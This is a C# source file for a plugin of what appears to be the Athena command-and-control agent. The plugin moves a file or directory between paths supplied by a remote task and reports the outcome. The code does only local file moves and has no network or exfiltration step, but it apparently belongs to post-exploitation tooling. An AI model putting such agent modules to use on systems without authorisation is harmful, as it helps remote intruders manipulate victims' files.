using System.IO;
using System;
using System.Collections.Generic;
using PluginBase;

namespace Plugins
{
    public class Plugin : AthenaPlugin
    {
        public override void Execute(Dictionary<string, object> args)
        {
            if (args.ContainsKey("source") && args.ContainsKey("destination"))
            {
                try
                {
                    FileAttributes attr = File.GetAttributes(((string)args["source"]).Replace("\"", ""));

                    // Check if Directory
                    if (attr.HasFlag(FileAttributes.Directory))
                    {
                        Directory.Move(((string)args["source"]).Replace("\"", ""), ((string)args["destination"]).Replace("\"", ""));
                    }
                    else
                    {
                        File.Move(((string)args["source"]).Replace("\"", ""), ((string)args["destination"]).Replace("\"", ""));
                    }

                    PluginHandler.AddResponse(new ResponseResult
                    {
                        completed = "true",
                        user_output = $"Moved {((string)args["source"]).Replace("\"", "")} to {((string)args["destination"]).Replace("\"", "")}",
                        task_id = (string)args["task-id"],
                    });
                }
                catch (Exception e)
                {
                    PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
                    return;
                }
            }
            else
            {
                PluginHandler.AddResponse(new ResponseResult
                {
                    completed = "true",
                    user_output = "Please specify both a source and destination for the file!",
                    task_id = (string)args["task-id"],
                });
            }
        }
    }
}
